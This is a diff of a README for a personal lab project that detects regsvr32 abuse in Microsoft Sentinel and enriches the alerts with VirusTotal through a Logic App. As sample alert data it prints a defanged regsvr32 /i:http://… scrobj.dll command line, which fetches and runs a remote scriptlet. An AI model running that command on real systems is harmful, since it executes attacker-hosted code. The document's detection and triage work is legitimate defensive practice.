@@ -1,119 +1,71 @@
-# **Regsvr32 SOAR Workflow with VirusTotal Enrichment**
+# **Phase 4 – SOAR Automation with Logic Apps (Microsoft Sentinel)**
 
 ## **Overview**
 
-This project simulates a medium-risk, high-noise detection scenario involving the abuse of regsvr32.exe — a trusted Windows binary often used in LOLBAS (Living Off the Land Binaries and Scripts) attacks. The goal was to detect potential misuse of regsvr32 for remote code execution, enrich the alert context via VirusTotal, and use SOAR (Security Orchestration, Automation, and Response) logic to reduce analyst workload through smart alerting and contextual decision-making.
+This phase explored SOAR (Security Orchestration, Automation, and Response) integration using Microsoft Sentinel and Logic Apps. The goal was to automate alert enrichment and response actions — simulating what an analyst would otherwise perform manually during triage. This pushed me outside my detection comfort zone and into the response domain, requiring a shift in thinking: what does an analyst *actually need* to make a decision quickly? What’s high-priority vs background noise?
 
-Unlike previous investigations that focused on multi-stage attack chains, this project pivots into **alert enrichment and triage automation** — demonstrating how to turn a simple detection into a scalable, analyst-ready workflow.
+## **Objectives**
 
----
+* Learn how Sentinel incidents trigger Logic Apps
 
-## **Why Regsvr32?**
+* Extract and enrich alert data using external APIs
 
-Regsvr32 is a signed Microsoft binary that allows execution of remote scripts via COM scriptlets hosted over HTTP/S. It’s abused by threat actors because:
+* Implement conditional branching to route high- and low-severity events
 
-* It’s **built-in**, **trusted**, and **commonly overlooked**
+* Simulate analyst workflows, especially IOC validation
 
-* Legitimate usage is rare and predictable
+* Learn to parse nested JSON structures inside alert payloads
 
-* Remote execution via regsvr32 almost always indicates suspicious activity
+## **Workflow Summary**
 
-This project targets regsvr32 executions **that include an HTTP reference in the command line**, which strongly implies the tool is being used to download and execute code from an external source. This behavior maps to **MITRE ATT\&CK T1218.010 – Signed Binary Proxy Execution: Regsvr32**.
+1. A KQL detection triggers on suspicious use of `regsvr32.exe` contacting an external IP via HTTP
 
-The key was not just detecting it, but doing something meaningful with the alert: **enrich, suppress noise, and inform response.**
+2. Sentinel creates an incident and triggers a Logic App
 
----
+3. The Logic App extracts alert fields from `ExtendedProperties`
 
-## **Detection Logic**
+4. Contacted IP is parsed and sent to VirusTotal via HTTP GET request
 
-The detection is based on **MITRE DS0017: Process Creation**, using Windows Event ID `1`. Because my lab uses the Microsoft Monitoring Agent (MMA), logs arrive as raw XML rather than in schema-based tables — requiring field extraction via `extract()` in KQL.
+5. The JSON response is parsed to extract `malicious` and `reputation` scores
 
-```kql 
-    Event 
-    | where EventID == 1 
-    | extend raw_xml = tostring(EventData) 
-    | extend 
-        Image = extract(@"<Data Name=""Image"">(.*?)</Data>", 1, raw_xml), 
-        CommandLine = extract(@"<Data Name=""CommandLine"">(.*?)</Data>", 1, raw_xml), 
-        ParentImage = extract(@"<Data Name=""ParentImage"">(.*?)</Data>", 1, raw_xml), 
-        User = extract(@"<Data Name=""User"">(.*?)</Data>", 1, raw_xml), 
-        IntegrityLevel = extract(@"<Data Name=""IntegrityLevel"">(.*?)</Data>", 1, raw_xml) 
-    | where Image endswith "regsvr32.exe" 
-        and CommandLine has "http" 
-```
+6. Branching logic evaluates the reputation:
 
-This query identifies executions of regsvr32 where the command line includes a remote payload — the exact behavior this project is designed to catch and enrich.
+   * If **malicious \> 0** or **reputation \< 0** → Send `[ALERT]` email
 
----
+   * Else → Send `[INFO]` email
 
-## **Field Extraction and Triage Context**
+## **Logic App Breakdown**
 
-These fields are extracted to drive enrichment and downstream decisions:
+* **Trigger**: Sentinel alert
 
-| Field | Purpose |
-| ----- | ----- |
-| Image | Confirms regsvr32.exe was executed |
-| CommandLine | Parses the URL or IP; reveals intent and payload |
-| ParentImage | Provides process ancestry — e.g., PowerShell is a strong signal |
-| User | Execution context (admin? service? test account?) |
-| IntegrityLevel | Indicates privilege level — rare for regsvr32 to run elevated |
-| ExtractedIP | Parsed using regex from the `CommandLine`; used in enrichment |
+* **Compose**: Extracts `ExtendedProperties` field
 
----
+* **Parse JSON**: Uses sample body to identify alert elements
 
-## **VirusTotal Integration**
+* **Field Extraction**: Manually parsed fields for clarity: User, Image, CommandLine, ParentImage, IntegrityLevel, Contacted IP
 
-The enrichment step uses VirusTotal’s **IP reputation API**. The Logic App sends a **GET** request to:
+* **HTTP Action**: GET request to VirusTotal API (with API key)
 
-https://www[.]virustotal.com/api/v3/ip\_addresses/{ExtractedIP}
+* **Parse JSON (VT)**: Extract `malicious` and `reputation` scores
 
-Using a personal API key and custom headers, it retrieves the full reputation object. From that JSON, the workflow parses:
+* **Condition Block**:
 
-* last\_analysis\_stats.malicious — number of AV engines flagging it
+  * `IF malicious > 0 OR reputation < 0` → Send alert email
 
-* reputation — VirusTotal's cumulative score
+  * `ELSE` → Send low-priority info email
 
-I used browser DevTools (network inspector) to manually query and examine the JSON schema before writing the parsing logic in Logic Apps.
+[View Logic App Workflow PDF](/sentinel__detection_projects/phase4_regsvr32_soar/logic_app_success.pdf)
 
-This lets me enrich the alert in real-time with **actual external evidence**, not just internal assumptions.
+**Email Output (ALERT)**:
 
----
-
-## **Branching Logic & Alert Flow**
-
-The SOAR logic applies a condition:
-
-IF malicious \> 0 OR reputation \< 0  
-  → Send ALERT email to SOC  
-ELSE  
-  → Send INFO email (low priority)
-
-This split allows:
-
-* High-confidence alerts to escalate immediately
-
-* Low-risk alerts to be logged passively
-
-* Complete coverage without overloading analysts
-
-In production, this structure would prevent alert fatigue **without missing early-stage threats**.
-
----
-
-## **Email Design**
-
-The email format is intentionally clean and analyst-friendly.
-
-### **Subject:**
-
+ Subject:  
 \[ALERT\] Suspicious Regsvr32 Activity | User: redteam | IP: 192.168.1.80
 
-### **Body:**
-
+Body:  
 \- User: redteam  
 \- Image: C:\\Windows\\System32\\regsvr32.exe  
 \- Parent Image: powershell.exe  
-\- CommandLine: regsvr32 /i:http://192[.]168[.]1[.]80/file.sct scrobj.dll  
+\- CommandLine: regsvr32 /i:http://192\[.\]168\[.\]1\[.\]80/file.sct scrobj.dll  
 \- Integrity Level: High  
 \- Contacted IP: 192.168.1.80  
 \- VT Malicious Score: 3  
@@ -124,84 +76,110 @@ Recommended Actions:
 \- Review traffic to the contacted IP  
 \- Isolate the host if confirmed
 
-The subject line offers **instant triage context**; the body gives **pivot points and next steps**.
+[View sent email alert](/sentinel__detection_projects/phase4_regsvr32_soar/email_alert.PNG)
+
+
+## **Technical Implementation**
+
+**KQL Trigger**:
+```kql
+Event
+| where EventID == 1
+| extend raw_xml = tostring(EventData)
+| extend 
+    Image = extract(@"<Data Name=""Image"">(.*?)</Data>", 1, raw_xml),
+    CommandLine = extract(@"<Data Name=""CommandLine"">(.*?)</Data>", 1, raw_xml),
+    ParentImage = extract(@"<Data Name=""ParentImage"">(.*?)</Data>", 1, raw_xml),
+    User = extract(@"<Data Name=""User"">(.*?)</Data>", 1, raw_xml),
+    IntegrityLevel = extract(@"<Data Name=""IntegrityLevel"">(.*?)</Data>", 1, raw_xml)
+| extend 
+    ExtractedIP = extract(@"http[s]?://([^/]+)", 1, CommandLine)
+| where Image endswith "regsvr32.exe" 
+    and CommandLine has "http"
+| project 
+    TimeGenerated, 
+    User, 
+    Image, 
+    CommandLine, 
+    ParentImage, 
+    IntegrityLevel,
+    ExtractedIP
+
+```
+*  **Note:** `ExtractedIP` was added in retrospect after realising that this critical indicator could be reliably parsed directly in KQL rather than extracted later via Logic Apps. This streamlined the enrichment process, enabling simpler Logic App parsing and improving alert context earlier in the workflow.
+
+* **Parsing Challenges**: The JSON inside ExtendedProperties required layered parsing. I used both UI and code view to troubleshoot, ultimately simplifying it by manually isolating each field in individual parse steps.
+
+* **VirusTotal Query**: Used HTTP GET to query IP reputation. Sample JSON response copied from browser DevTools, then used to structure the `Parse JSON` action.
+
+## **Analyst Workflow Impact**
+
+Without automation, an analyst would:
+
+* Manually extract the contacted IP from alert
+
+* Search VirusTotal manually
+
+* Estimate severity based on returned data
+
+* Write a case summary
+
+This Logic App replaces all of that with:
+
+* IOC enrichment
+
+* Structured alert context
+
+* Severity-based tagging via email subject
+
+It reduces MTTR, helps prevent alert fatigue, and supports faster escalation.
+
+## **Triage Mapping**
+
+* `[ALERT]` emails simulate Priority: High cases for SOC queues
+
+* `[INFO]` emails simulate lower priority events (e.g., shadow IT, internal testing)
+
+* Escalation logic is based on **malicious score** and **reputation**
+
+## **Lessons Learned**
+
+* Parsing nested JSON from Sentinel alerts is messy, especially when working with `ExtendedProperties`. Learning to inspect the payload in code view helped me understand field structure.
+
+* Email formatting matters — structured fields make analyst review easier.
+
+* I overcomplicated some parts of the flow but now understand how to streamline it.
+
+## **Real-World Improvements**
+
+If deploying this in a live SOC, I’d implement:
+
+1. **Error Handling for VT Failures**
+
+   * Add branch to handle 404 or timeout
+
+   * Fallback enrichment (AbuseIPDB) or notify analyst with warning
+
+2. **Filename Extraction & Hashing**
+
+   * Parse filename from command line (e.g., `file.sct`)
+
+   * Hash and enrich using file reputation services (e.g., ReversingLabs)
+
+3. **Expanded Conditional Logic**
+
+   * Add new branches: `if malicious > 0`, `if file_score > X`, etc.
+
+4. **Tagging Known-Good Use**
+
+   * Add allowlist for known internal IPs, accounts, or automation sources
+
+   * Log these quietly but avoid notifying analysts
+
+5. **Integration with Case Management**
+
+   * Route enriched alerts directly into a ticketing system like TheHive or ServiceNow
 
 ---
 
-## **Reflection and What I Learned**
-
-This project marked my first time designing a complete SOAR workflow — not just writing detections, but building a system that takes raw alerts, enriches them with external intelligence, and produces outcomes that save time and support decision-making. It forced me to think like both a SOC analyst and a detection engineer: how to structure signals, reduce noise, and deliver relevant context to the right place at the right time.
-
-Key skills I developed:
-
-* **Working with JSON in Logic Apps** — including how to reverse-engineer API responses using DevTools, extract the schema structure, and parse only the relevant fields
-
-* **Designing conditional logic** to filter noise without missing real threats
-
-* **Building enrichment workflows** that reflect real-world use cases — not just lab setups
-
----
-
-### **Ideas for Further Improvement**
-
-If I were deploying this in a production SOC, these are the changes I’d make to extend and harden the system:
-
----
-
-#### **1\. Branching on HTTP Status Code**
-
-If the VirusTotal request fails (e.g. IP not found), the response returns a 404\. Currently, that breaks the flow. I’d add a condition to check the statusCode directly after the HTTP call. If it equals 404, I’d route the logic to either a secondary enrichment source (like AbuseIPDB) or still notify the SOC with a tag like "VirusTotal lookup unavailable".
-
-Prevents silent failures — the alert still reaches the analyst with appropriate context.
-
----
-
-#### **2\. Filename Extraction from Command Line**
-
-Right now, only the IP is parsed. I’d extend the KQL to also extract the filename from the URL (using parse\_url() or regex). That would allow me to pass the filename to the Logic App, calculate a hash (e.g. SHA256), and enable deeper file-based enrichment.
-
----
-
-#### **3\. Hash-Based Enrichment**
-
-With the filename extracted and hashed, I’d query a file reputation API (e.g. Hybrid Analysis or ReversingLabs) alongside VirusTotal. The resulting file score would be parsed and added to the branching logic.
-
-This helps detect **malicious files hosted on clean infrastructure**, which would otherwise evade IP-based detection alone.
-
----
-
-#### **4\. Expanded Conditional Logic**
-
-Currently, alerts trigger if:
-
-malicious \> 0 OR reputation \< 0
-
-With hash-based enrichment added, I’d extend the condition to:
-
-malicious \> 0 OR reputation \< 0 OR file\_score \> threshold
-
-This tightens the funnel and increases the likelihood that alerts represent true threats, without becoming overly aggressive.
-
----
-
-#### **5\. Tagging Known-Good Use Cases**
-
-Eventually, I’d implement a tagging or allowlisting mechanism — for example, to suppress alerts from internal test environments or known automation. This would allow silent logging without polluting the analyst’s queue.
-
----
-
-### **Final Thoughts**
-
-This project wasn’t about building a perfect detection — it was about showing that I can:
-
-* Take a noisy but relevant technique
-
-* Build a reliable, low-noise detection
-
-* Enrich it with external intelligence
-
-* Use branching logic to drive decisions
-
-* And design something a SOC analyst would actually want to receive at 2AM
-
-I now feel confident not just writing detection rules, but thinking end-to-end about **how alerts should flow**, **who they’re for**, and **what makes them actionable**.
+This phase brought the project full circle — moving from detection to triage and enrichment. It represents what a junior analyst should aim to learn post-detection: how to reduce triage time, surface critical IOCs, and improve SOC efficiency through lightweight, automatable processes.
